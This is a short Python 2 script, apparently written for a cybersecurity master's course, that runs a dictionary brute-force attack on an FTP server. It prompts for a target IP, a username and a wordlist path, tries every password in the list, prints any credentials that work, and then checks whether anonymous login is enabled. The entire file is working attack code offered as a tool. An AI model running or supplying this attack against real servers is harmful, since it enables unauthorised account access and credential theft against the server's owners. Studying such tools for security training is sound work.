
print  "\n |-------------------------------------------------------------------|"
print  "|                 ATAQUE FTP NUEVA EDICION 2021                        |"
print  "|               Editor: Sebastian Piedrahita Perez                     |"
print  "|                   Master en Ciberseguridad                           |"
print  "|                tutor: Profesor Francisco Sanz                        |"
print  "|----------------------------------------------------------------------|"


import sys
from ftplib import FTP

target = raw_input("Introduce la direccion ip: ")
username = raw_input("introduce el nombre de usuario: ")
wordlist = raw_input("introduce el path completo donde se encuentra el diccionario: ")



def Busca_anonymous_login(target):
    try:
        ftp = FTP(target)
        ftp.login()
        print "\n[+] El Usuario Anonymous esta habilitado."
        print "\n[+] Nombre de Usuario : anonymous"
        print "\n[+] Password : anonymous\n"
        ftp.quit()
    except:
        pass


def ftp_login(target, username, password):
    try:
        ftp = FTP(target)
        ftp.login(username, password)
        ftp.quit()
        print "\n[!] las credenciales fueron encontradas."
        print "\n[!] EL Nombre de Usuario es : {}".format(username)
        print "\n[!] El Password es : {}".format(password)
        sys.exit(0)
    except:
        pass


def Ataque_Fuerza_Bruta(target, username, wordlist):
    try:
        wordlist = open(wordlist, "r")
        words = wordlist.readlines()
        for word in words:
            word = word.strip()
            ftp_login(target, username, word)

    except:
        print "\n[-] el diccionario no existe. \n"
        sys.exit(0)


Ataque_Fuerza_Bruta(target, username, wordlist)
Busca_anonymous_login(target)
print "\n[-] El Ataque Fue Finalizado. \n"